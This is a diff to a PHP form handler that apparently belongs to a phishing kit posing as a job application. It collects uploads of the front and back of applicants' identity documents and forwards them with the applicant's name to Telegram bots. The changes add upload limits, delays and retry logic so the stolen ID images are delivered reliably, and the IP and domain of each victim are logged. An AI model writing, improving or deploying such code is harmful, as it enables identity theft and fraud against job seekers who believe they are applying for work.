@@ -1,4 +1,11 @@
 <?php
+// 🚨 ADD THESE LINES AT THE TOP - Memory and timeout fixes
+ini_set('upload_max_filesize', '10M');
+ini_set('post_max_size', '12M');
+ini_set('max_execution_time', 120);
+ini_set('max_input_time', 120);
+ini_set('memory_limit', '256M');
+
 ob_start(); // Start output buffering to prevent headers already sent
 
 // include 'firewall.php';
@@ -158,6 +165,10 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     }
 
     $front_id = uploadFile("q17_uploadYour", "front_id");
+    
+    // 🚨 ADD SMALL DELAY BETWEEN UPLOADS
+    if (function_exists('usleep')) usleep(500000); // 0.5 second delay
+    
     $back_id = uploadFile("q26_identityVerification", "back_id");
 
     // 🧾 Format Telegram message
@@ -198,7 +209,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         curl_close($ch);
     }
 
-    // 📤 FIXED: Enhanced file sending with better format support
+    // 📤 FIXED: Enhanced file sending with better format support AND RETRY LOGIC
     function sendFile($file, $caption, $bots) {
         if (!$file || !is_string($file) || !file_exists($file)) return;
         
@@ -222,23 +233,55 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                 'parse_mode' => 'Markdown'
             ];
 
-            $ch = curl_init($url);
-            curl_setopt_array($ch, [
-                CURLOPT_POST => true, 
-                CURLOPT_POSTFIELDS => $payload, 
-                CURLOPT_RETURNTRANSFER => true,
-                CURLOPT_TIMEOUT => 60 // Longer timeout for file uploads
-            ]);
-            $result = curl_exec($ch);
-            if (curl_error($ch)) {
-                log_entry("❌ Telegram file error: " . curl_error($ch));
+            // 🚨 ADD RETRY LOGIC (2 attempts)
+            $max_attempts = 2;
+            $attempt = 1;
+            
+            while ($attempt <= $max_attempts) {
+                $ch = curl_init($url);
+                curl_setopt_array($ch, [
+                    CURLOPT_POST => true, 
+                    CURLOPT_POSTFIELDS => $payload, 
+                    CURLOPT_RETURNTRANSFER => true,
+                    CURLOPT_TIMEOUT => 60, // Longer timeout for file uploads
+                    CURLOPT_HTTPHEADER => [
+                        'Content-Type: multipart/form-data'
+                    ]
+                ]);
+                
+                $result = curl_exec($ch);
+                $success = true;
+                
+                if (curl_error($ch)) {
+                    log_entry("❌ Telegram file error (attempt $attempt): " . curl_error($ch));
+                    $success = false;
+                }
+                
+                curl_close($ch);
+                
+                if ($success) {
+                    log_entry("✅ File sent successfully on attempt $attempt");
+                    break; // Success, exit retry loop
+                }
+                
+                $attempt++;
+                if ($attempt <= $max_attempts) {
+                    sleep(2); // Wait 2 seconds before retry
+                }
             }
-            curl_close($ch);
         }
     }
 
-    sendFile($front_id, "📎 *Front ID* for $full_name", $config['bots']);
-    sendFile($back_id, "📎 *Back ID* for $full_name", $config['bots']);
+    // 🚨 ADD DELAYS BETWEEN FILE SENDS
+    if ($front_id) {
+        sendFile($front_id, "📎 *Front ID* for $full_name", $config['bots']);
+        sleep(2); // 2 second delay between file sends
+    }
+    
+    if ($back_id) {
+        sendFile($back_id, "📎 *Back ID* for $full_name", $config['bots']);
+        sleep(1); // 1 second delay after last file
+    }
 
     log_entry("✅ [$domain] Job application received from $ip ($full_name)");
 
